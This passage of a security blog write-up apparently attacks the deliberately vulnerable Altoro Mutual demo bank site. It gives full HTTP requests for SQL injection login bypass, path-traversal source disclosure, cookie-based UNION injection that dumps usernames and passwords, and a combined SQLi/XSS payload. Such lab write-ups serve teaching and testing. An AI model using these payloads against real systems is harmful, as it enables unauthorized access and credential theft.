System.Data.OleDb.OleDbException: Syntax error (missing operator) in query expression 'username = 'admin'' AND password = 'test''. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Authentication.ValidateUser(String uName, String pWord) in d:downloadsAltoroMutual_v6websiteanklogin.aspx.cs:line 68 at Altoro.Authentication.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websiteanklogin.aspx.cs:line 33 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
</pre>

<p><a href="http://dornea.nu/wargames/altoro-mutual?action=AttachFile&amp;do=get&amp;target=login_sql_injection.png" title="attachment:login_sql_injection.png">lkashd oada</a></p>
<p><em>Single quotes</em>Â are obvisouly not escaped so we could inject some SQL statements. Let&#8217;s try some common ones likeÂ <strong>admin&#8217; OR 1=1;&#8211;</strong>:Â </p>
<pre>POST /bank/login.aspx HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://demo.testfire.net/bank/login.aspx
Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
uid=admin' OR 1=1;--&passw=test&btnSubmit=Login
</pre>

<p>The result looks very promising! We were able to login without specifying any password. All you need is a valid username. The same vulnerability applies to theÂ <em>password</em>Â field as well. Following request will work too:</p>
<pre>#!highlight c# 
POST /bank/login.aspx HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://demo.testfire.net/bank/login.aspx
Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==&Password=dGVzdA==
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
uid=admin&passw=' OR 1=1;--&btnSubmit=Login</pre>

<h3 id="Base64-encoded_login_credentials"><span id="Base64-encoded_login_credentials">Base64-encoded login credentials</span></h3>
<p>After a successful login the server will set a cookieÂ <em>amUserInfo</em>Â which contains login information encoded in base64. This is for sure a vulnerability since an attacker could easily decode the information and get the login credentials.</p>
<pre>amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==&Password=dGVzdA==
</pre>

<p>decodes to&#8230;</p>
<pre>amUserInfo=Username=admin' OR 1=2;--&Password=test
</pre>

<p>&nbsp;</p>
<h2 id="A.2Fbank.2Fmain.aspx"><span id="bankmainaspx">/bank/main.aspxÂ </span></h2>
<hr />
<p>After a successful login you&#8217;ll be redirected toÂ <a href="http://demo.testfire.net/bank/main.aspx">http://demo.testfire.net/bank/main.aspx</a>. Let&#8217;s have a look at the functionalities within this page.</p>
<p>&nbsp;</p>
<h3 id="Source_code_disclosure-1"><span id="Source_code_disclosure">Source code disclosure</span></h3>
<p>Here&#8217;s the source code (<a href="http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%00.txt</a>)</p>
<pre>using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.OleDb;
using System.Web;
using System.Web.SessionState;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.HtmlControls;
using System.Configuration;
namespace Altoro
{
    /// &lt;summary&gt;
    /// Summary description for welcome.
    /// &lt;/summary&gt;
    public partial class Default : Page
    {
        protected void Page_Load(object sender, System.EventArgs e)
        {
            Response.Cache.SetCacheability(HttpCacheability.NoCache);
            if (!(System.Convert.ToBoolean(Session["authenticated"])))
            {
                Server.Transfer("logout.aspx");
            }
            string thisUser = Request.Cookies["amUserId"].Value;
            DataRow myRow;
            DataTable acctTable = GetAccounts(thisUser);
            CheckPromo(thisUser);
            for (int i = 0; i &lt; acctTable.Rows.Count; i++)
            {
                myRow = acctTable.Rows[i];
                ArrayList myList = new ArrayList();
                myList.Add(myRow["accountid"].ToString());
                myList.Add(myRow["accountid"].ToString() + " " + myRow["acct_type"].ToString());
                listAccounts.myItems.Add(myList);
            }
        }
        private DataTable GetAccounts(string userId)
        {
            OleDbConnection myConnection = new OleDbConnection();
            myConnection.ConnectionString = ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString;
            myConnection.Open();
            string query = "SELECT accountid, acct_type From accounts WHERE userid = " + userId;
            OleDbDataAdapter myAccounts = new OleDbDataAdapter(query, myConnection);
            DataSet ds = new DataSet();
            myAccounts.Fill(ds, "accounts");
            DataTable myTable = ds.Tables["accounts"];
            myConnection.Close();
            return myTable;
        }
        private void WritePromo(string cType, string cLimit, string cInterest)
        {
            string promoText = "&lt;table width=590 border=0&gt;";
            promoText += "&lt;tr&gt;&lt;td&gt;&lt;h2&gt;Congratulations! &lt;/h2&gt;&lt;/td&gt;&lt;/tr&gt;";
            promoText += "&lt;tr&gt;&lt;td&gt;You have been pre-approved for an Altoro ";
            promoText += cType;
            promoText += " Visa with a credit limit of $";
            promoText += cLimit;
            promoText += "!&lt;/td&gt;&lt;/tr&gt;";
            promoText += "&lt;tr&gt;&lt;td&gt;Click &lt;a href='apply.aspx";
            promoText += "'&gt;Here&lt;/a&gt; to apply.&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
            promo.Visible = true;
            promo.Text = promoText;
        }
        private void CheckPromo(string strUserId)
        {
            if (Request.Cookies["amCreditOffer"] != null)
            {
                    HttpCookie CreditOffer = Request.Cookies["amCreditOffer"];
              WritePromo(CreditOffer["CardType"], CreditOffer["Limit"], CreditOffer["Interest"]);
            }
        }
        protected String GetSessionValue(String key)
        {
            if (Request.Cookies["amUserId"].Value==Session["userId"].ToString())
            {
                return Session[key].ToString();
                }
                else
                {
                        return "";
                }
        }
        #region Web Form Designer generated code
        override protected void OnInit(EventArgs e)
        {
            //
            // CODEGEN: This call is required by the ASP.NET Web Form Designer.
            //
            InitializeComponent();
            base.OnInit(e);
        }
        /// &lt;summary&gt;
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// &lt;/summary&gt;
        private void InitializeComponent()
        {
        }
        #endregion
    }
}
</pre>

<p>&nbsp;</p>
<h3 id="SQL_injection_using_Cookie_data"><span id="SQL_injection_using_Cookie_data">SQL injection using Cookie data</span></h3>
<p>After login following request will be sent to the server:</p>
<pre>GET /bank/main.aspx HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://demo.testfire.net/bank/login.aspx
Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4=&Password=YWRtaW4=; amUserId=1
</pre>

<p>A look at theÂ <em>GetAccounts</em>Â in the source code reveals thatÂ <em>userId</em>Â is actually some data from the cookieÂ <em>amUserId</em>Â and never gets sanitized. Let&#8217;s have some fun:</p>
<pre>#!highlight html 
GET /bank/main.aspx HTTP/1.1
...
amUserInfo=UserName=YWRtaW4=&Password=YWRtaW4=; amUserId=1'
</pre>

<p><em>amUserId</em>Â was changed and the whole GET request was sent again to the server. The response was quite informative:Â </p>
<pre>#!highlight asp-cx 
An Error Has Occurred
Summary:
Syntax error in string in query expression 'userid = 1''.
Error Message:
System.Data.OleDb.OleDbException: Syntax error in string in query expression 'userid = 1''. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object& executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Default.GetAccounts(String userId) in d:downloadsAltoroMutual_v6websiteankmain.aspx.cs:line 54 at Altoro.Default.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websiteankmain.aspx.cs:line 31 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
</pre>

<p><a href="http://static.dornea.nu/img/2013/b1026f72d91a1a47e093af15e154b71d.png" title="attachment:main_sql_injection.png"><img title="attachment:main_sql_injection.png" alt="SQL Injection" src="http://static.dornea.nu/img/2013/b1026f72d91a1a47e093af15e154b71d.png" width="NaN" height="580" /></a></p>
<p>Ahhh, there we go!Â <strong>Another SQL injection vulnerability!</strong>Â You could now dump some data:</p>
<p>&nbsp;</p>
<pre>#!highlight html 
GET /bank/main.aspx HTTP/1.1
Host: demo.testfire.net
...
amUserInfo=UserName=YWRtaW4=&Password=YWRtaW4=; amUserId=2 union select accountid, acct_type from accounts;--
</pre>

<p><a href="http://static.dornea.nu/img/2013/89e21aed3343e3512a8eb6267ea8b7bf.png" title="attachment:main_sql_injection2.png"><img title="attachment:main_sql_injection2.png" alt="SQL Injection" src="http://static.dornea.nu/img/2013/89e21aed3343e3512a8eb6267ea8b7bf.png" width="NaN" height="578" /></a></p>
<p>You could use this vulnerability toÂ <strong>dump theÂ <em>users</em>Â table</strong>:</p>
<pre>GET /bank/main.aspx HTTP/1.1
Host: demo.testfire.net
...
amUserInfo=UserName=YWRtaW4=&Password=YWRtaW4=; amUserId=2 union select username, password from users;--
</pre>

<p>This will return:</p>
<pre>admin admin
cclay Ali
jsmith Demo1234
sjoe frazier
sspeed Demo1234
tuser tuser
</pre>

<p>Simple, isn&#8217;t it? <img src="http://dornea.nu/wp-includes/images/smilies/icon_biggrin.gif" alt=":-D" class="wp-smiley" /> </p>
<p>&nbsp;</p>
<h3 id="XSS_using_cookie_data"><span id="XSS_using_cookie_data">XSS using cookie data</span></h3>
<p>Alternatively you could combine SQLi with XSS:</p>
<pre>#!highlight html 
GET /bank/main.aspx HTTP/1.1
Host: demo.testfire.net
...
amUserInfo=UserName=YWRtaW4=&Password=YWRtaW4=; amUserId=2 union select "&lt;script&gt;alert(1234)&lt;/script&gt;", "Injection FOUND!" from accounts;--
</pre>

<p><a href="http://static.dornea.nu/img/2013/fe65a05f2bc5e5ec889f64f81e9f007e.png" title="attachment:main_sql_injection_with_xss.png"><img title="attachment:main_sql_injection_with_xss.png" alt="SQL Injection" src="http://static.dornea.nu/img/2013/fe65a05f2bc5e5ec889f64f81e9f007e.png" width="NaN" height="581" /></a></p>
            </div>
            <!-- /.entry-content -->
<section class="well" id="related-posts">
    <h4>Related Posts:</h4>
    <ul>
        <li><a href="http://blog.dornea.nu/2014/06/02/googles-xss-game-solutions">Googles XSS Game - Solutions</a></li>
        <li><a href="http://blog.dornea.nu/2014/05/27/berlinsides-0x05">BerlinSides 0x05</a></li>
        <li><a href="http://blog.dornea.nu/2015/07/01/debugging-android-native-shared-libraries">Debugging Android native shared libraries</a></li>
        <li><a href="http://blog.dornea.nu/2009/08/05/howto-ssh-tunnel-over-corkscrew-using-tor">HowTo: SSH-Tunnel over CorkScrew using Tor</a></li>
        <li><a href="http://blog.dornea.nu/2011/11/09/thank-god-there-is-iodine-ipv4-over-dns">Thank God there is iodine! IPv4 over DNS</a></li>
    </ul>
</section>
    <hr />
    <!-- AddThis Button BEGIN -->
    <div class="addthis_toolbox addthis_default_style">
            <a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
            <a class="addthis_button_tweet"></a>
            <a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
    </div>
    <!-- AddThis Button END -->
    <hr/>
    <section class="comments" id="comments">
        <h2>Comments</h2>

        <div id="disqus_thread"></div>
        <script type="text/javascript">
            /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
            var disqus_shortname = 'dorneanu'; // required: replace example with your forum shortname

                    var disqus_identifier = 'hacking-altoro-mutual';
                var disqus_url = 'http://blog.dornea.nu/2013/05/06/hacking-altoro-mutual';

            var disqus_config = function () {
                this.language = "en";
            };

            /* * * DON'T EDIT BELOW THIS LINE * * */
            (function () {
                var dsq = document.createElement('script');
                dsq.type = 'text/javascript';
                dsq.async = true;
                dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
            })();
        </script>
        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
            Disqus.</a></noscript>
        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

    </section>
        </article>
    </section>

        </div>
        <div class="col-sm-3" id="sidebar">
            <aside>

<section class="well well-sm">
    <ul class="list-group list-group-flush">
            <li class="list-group-item"><h4><i class="fa fa-home fa-lg"></i><span class="icon-label">Social</span></h4>
              <ul class="list-group" id="social">
                <li class="list-group-item"><a href="http://twitter.com/DaanDebie"><i class="fa fa-twitter-square fa-lg"></i> twitter</a></li>
                <li class="list-group-item"><a href="http://www.linkedin.com/in/danieldebie"><i class="fa fa-linkedin-square fa-lg"></i> linkedin</a></li>
                <li class="list-group-item"><a href="http://github.com/DandyDev"><i class="fa fa-github-square fa-lg"></i> github</a></li>
              </ul>
            </li>

            <li class="list-group-item"><h4><i class="fa fa-home fa-lg"></i><span class="icon-label">Recent Posts</span></h4>
                <ul class="list-group" id="recentposts">
                    <li class="list-group-item">
                        <a href="http://blog.dornea.nu/2015/07/01/debugging-android-native-shared-libraries">
                            Debugging Android native shared libraries
                        </a>
                    </li>
                    <li class="list-group-item">
                        <a href="http://blog.dornea.nu/2015/06/22/decode-adobe-flex-amf-protocol">
                            Decode Adobe Flex AMF protocol
                        </a>
                    </li>
                    <li class="list-group-item">
                        <a href="http://blog.dornea.nu/2015/06/03/usd-ag-hacker-day-in-hamburg">
                            usd AG Hacker Day in Hamburg
                        </a>
                    </li>
                    <li class="list-group-item">
                        <a href="http://blog.dornea.nu/2015/05/24/validating-and-pinning-x509-certificates">
                            Validating and pinning X.509 certificates
                        </a>
                    </li>
                    <li class="list-group-item">
                        <a href="http://blog.dornea.nu/2015/05/06/adding-concurrency-to-smalisca">
                            Adding concurrency to smalisca
                        </a>
                    </li>
                </ul>
            </li>

            <li class="list-group-item"><a href="http://blog.dornea.nu/"><h4><i class="fa fa-home fa-lg"></i><span class="icon-label">Categories</span></h4></a>
                <ul class="list-group" id="categories">
                    <li class="list-group-item">
                        <a href="http://blog.dornea.nu/category/blog">
                            <i class="fa fa-folder-open fa-lg"></i> blog
                        </a>
                    </li>
                    <li class="list-group-item">
                        <a href="http://blog.dornea.nu/category/notes">
                            <i class="fa fa-folder-open fa-lg"></i> notes
                        </a>
                    </li>
                </ul>
            </li>

            <li class="list-group-item"><a href="http://blog.dornea.nu/"><h4><i class="fa fa-tags fa-lg"></i><span class="icon-label">Tags</span></h4></a>
                <ul class="list-group " id="tags">
                    <li class="list-group-item tag-1">
                        <a href="http://blog.dornea.nu/tag/network/">
                            network
                        </a>
                    </li>
                    <li class="list-group-item tag-1">
                        <a href="http://blog.dornea.nu/tag/misc/">
                            misc
                        </a>
                    </li>
                    <li class="list-group-item tag-1">
                        <a href="http://blog.dornea.nu/tag/web/">
                            web
                        </a>
                    </li>
                    <li class="list-group-item tag-1">
                        <a href="http://blog.dornea.nu/tag/android/">
                            android
                        </a>
                    </li>
                    <li class="list-group-item tag-1">
                        <a href="http://blog.dornea.nu/tag/coding/">
                            coding
                        </a>
                    </li>
                    <li class="list-group-item tag-1">
                        <a href="http://blog.dornea.nu/tag/howto/">
                            howto
                        </a>
                    </li>
                    <li class="list-group-item tag-1">
                        <a href="http://blog.dornea.nu/tag/security/">
                            security
                        </a>
                    </li>
                    <li class="list-group-item tag-1">
                        <a href="http://blog.dornea.nu/tag/low/">
                            low
                        </a>
                    </li>
                    <li class="list-group-item tag-1">
                        <a href="http://blog.dornea.nu/tag/wtf/">
                            wtf
                        </a>
                    </li>
                    <li class="list-group-item tag-1">
                        <a href="http://blog.dornea.nu/tag/mobile/">
                            mobile
                        </a>
                    </li>
                    <li class="list-group-item tag-1">
                        <a href="http://blog.dornea.nu/tag/hacking/">
                            hacking
                        </a>
                    </li>
                    <li class="list-group-item tag-1">
                        <a href="http://blog.dornea.nu/tag/ipython/">
                            ipython
                        </a>
                    </li>
                    <li class="list-group-item tag-2">
                        <a href="http://blog.dornea.nu/tag/python/">
                            python
                        </a>
                    </li>
                    <li class="list-group-item tag-2">
                        <a href="http://blog.dornea.nu/tag/note/">
                            note
                        </a>
                    </li>
                    <li class="list-group-item tag-2">
                        <a href="http://blog.dornea.nu/tag/wargames/">
                            wargames
                        </a>
                    </li>
                    <li class="list-group-item tag-2">
                        <a href="http://blog.dornea.nu/tag/virtualization/">
                            virtualization
                        </a>
                    </li>
                    <li class="list-group-item tag-2">
                        <a href="http://blog.dornea.nu/tag/uncategorized/">
                            uncategorized
                        </a>
                    </li>
                    <li class="list-group-item tag-2">
                        <a href="http://blog.dornea.nu/tag/appsec/">
                            appsec
                        </a>
                    </li>
                    <li class="list-group-item tag-3">
                        <a href="http://blog.dornea.nu/tag/c/">
                            c
                        </a>
                    </li>
                    <li class="list-group-item tag-3">
                        <a href="http://blog.dornea.nu/tag/networking/">
                            networking
                        </a>
                    </li>
                    <li class="list-group-item tag-3">
                        <a href="http://blog.dornea.nu/tag/ios/">
                            ios
                        </a>
                    </li>
                    <li class="list-group-item tag-3">
                        <a href="http://blog.dornea.nu/tag/androguard/">
                            androguard
                        </a>
                    </li>
                    <li class="list-group-item tag-3">
                        <a href="http://blog.dornea.nu/tag/code/">
                            code
                        </a>
                    </li>
                    <li class="list-group-item tag-3">
                        <a href="http://blog.dornea.nu/tag/pelican/">
                            pelican
                        </a>
                    </li>
                    <li class="list-group-item tag-3">
                        <a href="http://blog.dornea.nu/tag/sca/">
                            sca
                        </a>
                    </li>
                    <li class="list-group-item tag-3">
                        <a href="http://blog.dornea.nu/tag/re/">
                            re
                        </a>
                    </li>
                    <li class="list-group-item tag-3">
                        <a href="http://blog.dornea.nu/tag/blog/">
                            blog
                        </a>
                    </li>
                    <li class="list-group-item tag-3">
                        <a href="http://blog.dornea.nu/tag/programming/">
                            programming
                        </a>
                    </li>
                    <li class="list-group-item tag-3">
                        <a href="http://blog.dornea.nu/tag/books/">
                            books
                        </a>
                    </li>
                    <li class="list-group-item tag-3">
                        <a href="http://blog.dornea.nu/tag/crypto/">
                            crypto
                        </a>
                    </li>
                    <li class="list-group-item tag-3">
                        <a href="http://blog.dornea.nu/tag/fakebanker/">
                            fakebanker
                        </a>
                    </li>
                    <li class="list-group-item tag-3">
                        <a href="http://blog.dornea.nu/tag/graphviz/">
                            graphviz
                        </a>
                    </li>
                    <li class="list-group-item tag-3">
                        <a href="http://blog.dornea.nu/tag/java/">
                            java
                        </a>
                    </li>
                    <li class="list-group-item tag-3">
                        <a href="http://blog.dornea.nu/tag/burp/">
                            burp
                        </a>
                    </li>
                    <li class="list-group-item tag-3">
                        <a href="http://blog.dornea.nu/tag/events/">
                            events
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/smalisca/">
                            smalisca
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/whatsapp/">
                            whatsapp
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/javascript/">
                            javascript
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/droidbox/">
                            droidbox
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/jquery/">
                            jquery
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/x509/">
                            x509
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/debug/">
                            debug
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/adobe/">
                            adobe
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/cryptography/">
                            cryptography
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/viz/">
                            viz
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/ssl/">
                            ssl
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/pandoc/">
                            pandoc
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/flash/">
                            flash
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/eclipse/">
                            eclipse
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/octopress/">
                            octopress
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/iptables/">
                            iptables
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/science/">
                            science
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/docker/">
                            docker
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/linux/">
                            linux
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/openssl/">
                            openssl
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/tls/">
                            tls
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/infosec/">
                            infosec
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/apple/">
                            apple
                        </a>
                    </li>
                    <li class="list-group-item tag-4">
                        <a href="http://blog.dornea.nu/tag/blockdiag/">
                            blockdiag
                        </a>
                    </li>
                </ul>
            </li>



    <li class="list-group-item"><h4><i class="fa fa-github fa-lg"></i><span class="icon-label">GitHub Repos</span></h4>
        <div id="gh_repos">
            <p class="list-group-item">Status updating...</p>
        </div>
    </li>

    <li class="list-group-item"><h4><i class="fa fa-twitter fa-lg"></i><span class="icon-label">Latest Tweets</span></h4></li>
    <div id="twitter_timeline">
        <a class="twitter-timeline" data-chrome="noheader" href="https://twitter.com/victordorneanu" data-widget-id="468295751982784514">Tweets by victordorneanu</a>
    </div>

<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>

    <li class="list-group-item"><h4><i class="fa fa-external-link-square fa-lg"></i><span class="icon-label">Links</span></h4>
      <ul class="list-group" id="links">
        <li class="list-group-item">
            <a href="http://dornea.nu/" target="_blank">
                dornea.nu
            </a>
        </li>
        <li class="list-group-item">
            <a href="http://nullsecurity.net" target="_blank">
                nullsecurity.net
            </a>
        </li>
        <li class="list-group-item">
            <a href="https://github.com/dorneanu" target="_blank">
                github.com/dorneanu
            </a>
        </li>
        <li class="list-group-item">
            <a href="https://github.com/nullsecurity" target="_blank">
                github.com/nullsecurity
            </a>
        </li>
      </ul>
    </li>
    </ul>
</section>
            </aside>
        </div>
    </div>
</div>
<footer>
   <div class="container">
      <hr>
      <div class="row">
         <div class="col-xs-10">&copy; 2015 Victor Dorneanu
            &middot; Powered by <a href="https://github.com/DandyDev/pelican-bootstrap3" target="_blank">pelican-bootstrap3</a>,
            <a href="http://docs.getpelican.com/" target="_blank">Pelican</a>,
            <a href="http://getbootstrap.com" target="_blank">Bootstrap</a>         </div>
         <div class="col-xs-2"><p class="pull-right"><i class="fa fa-arrow-up"></i> <a href="#">Back to top</a></p></div>
      </div>
   </div>
</footer>
<script src="http://blog.dornea.nu/theme/js/jquery.min.js"></script>

<!-- Include all compiled plugins (below), or include individual files as needed -->
<script src="http://blog.dornea.nu/theme/js/bootstrap.min.js"></script>

<!-- Enable responsive features in IE8 with Respond.js (https://github.com/scottjehl/Respond) -->
<script src="http://blog.dornea.nu/theme/js/respond.min.js"></script>

    <!-- GitHub JS -->
    <script type="text/javascript">
        $(document).ready(function () {
            if (!window.jXHR) {
                var jxhr = document.createElement('script');
                jxhr.type = 'text/javascript';
                jxhr.src = 'http://blog.dornea.nu/theme/js/jXHR.js';
                var s = document.getElementsByTagName('script')[0];
                s.parentNode.insertBefore(jxhr, s);
            }

            github.showRepos({
                user: 'dorneanu',
                count: 5,
                skip_forks: false,
                target: '#gh_repos'
            });
        });
    </script>
    <script src="http://blog.dornea.nu/theme/js/github.js" type="text/javascript"></script>
    <!-- End GitHub JS Code -->
    <!-- Disqus -->
    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'dorneanu'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function () {
            var s = document.createElement('script');
            s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
    </script>
    <!-- End Disqus Code -->
    <!-- Google Analytics -->
    <script type="text/javascript">

        var _gaq = _gaq || [];
        _gaq.push(['_setAccount', 'UA-7161767-3']);
        _gaq.push(['_trackPageview']);

        (function () {
            var ga = document.createElement('script');
            ga.type = 'text/javascript';
            ga.async = true;
            ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(ga, s);
        })();
    </script>
    <!-- End Google Analytics Code -->

    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-559fc4045bb79811"></script>
</body>
</html>